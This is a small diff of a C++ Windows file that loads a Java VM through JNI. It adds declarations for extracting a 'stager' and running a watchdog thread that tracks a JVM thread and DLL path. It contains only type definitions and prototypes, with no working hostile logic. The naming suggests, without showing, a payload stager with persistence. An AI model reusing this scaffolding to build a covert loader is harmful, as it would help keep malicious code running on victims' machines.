@@ -5,21 +5,25 @@
 #include <string>
 #include "include/jni.h"
 
-//#define START_CLASS_NAME	"stager/Stager"
-//#define IGNORE_SIG          "-Xrs"
-//#define JAVADIR				"C:\\Program Files\\Java"
-//#define JAVADIR_X64  		"C:\\Program Files (x86)\\Java"
-//#define JVM_NAME            "\\jvm.dll"
-//#define JVM_CLIENT_PATH		"\\bin\\client"
-//#define JVM_SERVER_PATH		"\\bin\\server"
-//#define MSVCR_PATH          "\\msvcr10.dll"
-//#define JAVA_VERSION_CMD	"java -version"
+#define COLON ":1"
 
 typedef jint (JNICALL *CreateJavaVM)(JavaVM **pvm, void **penv, void *args);
 typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
 
+/*
+ * Struct for starting the watchdog thread
+ */
+typedef struct {
+    unsigned long watchdog_pid;                   
+    HANDLE thread_stop_event;
+	HANDLE jvm_thread;
+	std::string *dll_path;
+} WATCHDOG_THREAD_STRUCT, *PWATCHDOG_THREAD_STRUCT;
+
 BOOL WINAPI InvokeMain( std::string*, std::string );
 VOID WINAPI InvokeShutdown();
+bool ExtractStager( std::string passedPath );
+unsigned int __stdcall StartWatchDog(void* a);
 
 //BOOL PrepareJava(std::string, std::string &);
 //BOOL LoadJava(std::string);
